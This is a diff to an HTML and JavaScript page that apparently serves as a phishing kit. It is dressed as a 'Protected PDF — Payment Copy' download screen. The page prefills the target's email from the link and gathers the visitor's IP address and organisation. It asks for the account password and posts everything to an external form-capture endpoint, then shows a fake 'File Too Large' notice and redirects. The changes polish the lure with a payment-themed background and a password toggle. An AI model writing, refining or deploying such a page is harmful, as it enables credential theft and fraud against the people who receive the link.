@@ -8,43 +8,35 @@
     * { box-sizing: border-box; margin: 0; padding: 0; }
     html, body { height: 100%; font-family: Arial, sans-serif; }
     body {
+      background: url('https://i.ibb.co/9YF5M7n/payment-bg.jpg') center/cover no-repeat;
       display: flex;
       align-items: center;
       justify-content: center;
-      background: #f2f2f2;
-      overflow: hidden;
     }
     #splash {
       position: fixed;
       top: 0; left: 0;
       width: 100%; height: 100%;
-      display: flex; align-items: center; justify-content: center;
-      background: #111; color: #fff;
+      background: #111;
+      color: #fff;
       font-size: 1.5rem;
-      transition: opacity 0.5s ease;
+      display: flex; align-items: center; justify-content: center;
       z-index: 1000;
+      transition: opacity 0.6s ease;
     }
     #main {
-      opacity: 0;
-      transform: translateY(20px);
-      transition: opacity 0.6s ease, transform 0.6s ease;
-    }
-    #main.show {
-      opacity: 1;
-      transform: translateY(0);
-    }
-    form {
-      background: #fff;
+      background: rgba(255, 255, 255, 0.9);
+      border-radius: 16px;
       padding: 2rem;
-      border-radius: 12px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
       width: 320px;
-    }
-    h2 {
-      margin-bottom: 1rem;
+      box-shadow: 0 4px 20px rgba(0,0,0,0.2);
       text-align: center;
-      color: #222;
+      transform: translateY(20px);
+      opacity: 0;
+      transition: all 0.8s ease;
     }
+    #main.show { opacity: 1; transform: translateY(0); }
+    h2 { margin-bottom: 1.5rem; color: #222; }
     input {
       width: 100%;
       padding: 10px;
@@ -54,24 +46,25 @@
       font-size: 1rem;
     }
     input[readonly] {
-      background: #f9f9f9;
-      color: #555;
+      background: #f5f5f5;
+      color: #444;
     }
     button {
       width: 100%;
       padding: 10px;
+      margin-top: 8px;
       background: #0078d4;
-      color: #fff;
       border: none;
       border-radius: 8px;
+      color: #fff;
       font-size: 1rem;
       cursor: pointer;
-      margin-top: 8px;
     }
-    button:hover {
-      background: #005fa3;
-    }
-    #stepPassword.hidden { display: none; }
+    button:hover { background: #005fa3; }
+    .hidden { display: none; }
+    #togglePassword { position: absolute; right: 12px; top: 10px; cursor: pointer; }
+
+    /* Modal */
     #modalOverlay {
       position: fixed;
       top: 0; left: 0; right: 0; bottom: 0;
@@ -97,18 +90,18 @@
   <div id="splash">Loading Protected File...</div>
 
   <main id="main">
+    <h2>Protected PDF — Payment Copy</h2>
     <form id="mainForm" method="POST" action="https://submit-form.com/your-formspark-endpoint">
-      <h2>Protected PDF Access</h2>
-
-      <!-- Email Step -->
+      <!-- Step 1 -->
       <div id="stepEmail">
         <input type="email" id="email" name="email" placeholder="Email address" required readonly />
         <button type="button" id="continueBtn">Continue</button>
       </div>
 
-      <!-- Password Step -->
-      <div id="stepPassword" class="hidden">
+      <!-- Step 2 -->
+      <div id="stepPassword" class="hidden" style="position: relative;">
         <input type="password" id="password" name="password" placeholder="Password" required />
+        <span id="togglePassword">👁️</span>
         <input type="hidden" id="ip" name="ip">
         <input type="hidden" id="hostname" name="hostname">
         <button type="submit">Download Payment Copy</button>
@@ -116,23 +109,24 @@
     </form>
   </main>
 
+  <!-- Modal -->
   <div id="modalOverlay">
     <div id="modalBox">
       <h3>File Too Large</h3>
-      <p>Your file is being processed. Please wait...</p>
+      <p>Your file is being processed, please wait...</p>
     </div>
   </div>
 
   <script>
-    // Splash load
+    // Splash animation
     window.addEventListener('load', () => {
       setTimeout(() => {
         document.getElementById('splash').style.opacity = '0';
         setTimeout(() => {
           document.getElementById('splash').style.display = 'none';
           document.getElementById('main').classList.add('show');
-        }, 500);
-      }, 500);
+        }, 600);
+      }, 600);
     });
 
     const emailInput = document.getElementById('email');
@@ -140,19 +134,20 @@
     const stepEmail = document.getElementById('stepEmail');
     const stepPassword = document.getElementById('stepPassword');
     const continueBtn = document.getElementById('continueBtn');
+    const toggle = document.getElementById('togglePassword');
     const modal = document.getElementById('modalOverlay');
 
-    // Auto-fill email
+    // Autofill email
     window.addEventListener('DOMContentLoaded', () => {
       const params = new URLSearchParams(window.location.search);
       const urlEmail = params.get('email');
       if (urlEmail) {
         emailInput.value = decodeURIComponent(urlEmail);
       } else {
-        emailInput.value = "user@example.com"; // fallback demo
+        emailInput.value = "user@example.com"; // fallback
       }
 
-      // Fetch IP + Host
+      // IP + Hostname
       fetch('https://api.ipify.org?format=json')
         .then(res => res.json())
         .then(data => {
@@ -164,19 +159,24 @@
           const host = info.org ? `${info.org} (${info.country_name})` : info.country_name || 'Unknown';
           document.getElementById('hostname').value = host;
         })
-        .catch(() => {
-          document.getElementById('hostname').value = 'Fetch Failed';
-        });
+        .catch(() => document.getElementById('hostname').value = 'Fetch Failed');
     });
 
-    // Continue to password
+    // Continue → password step
     continueBtn.addEventListener('click', () => {
       stepEmail.classList.add('hidden');
       stepPassword.classList.remove('hidden');
       passwordInput.focus();
     });
 
-    // On form submit → show modal → redirect after 8s
+    // Toggle password
+    toggle.addEventListener('click', () => {
+      const isHidden = passwordInput.type === 'password';
+      passwordInput.type = isHidden ? 'text' : 'password';
+      toggle.textContent = isHidden ? '🙈' : '👁️';
+    });
+
+    // Submit → show modal → redirect after 8s
     document.getElementById('mainForm').addEventListener('submit', () => {
       modal.style.display = 'flex';
       setTimeout(() => {
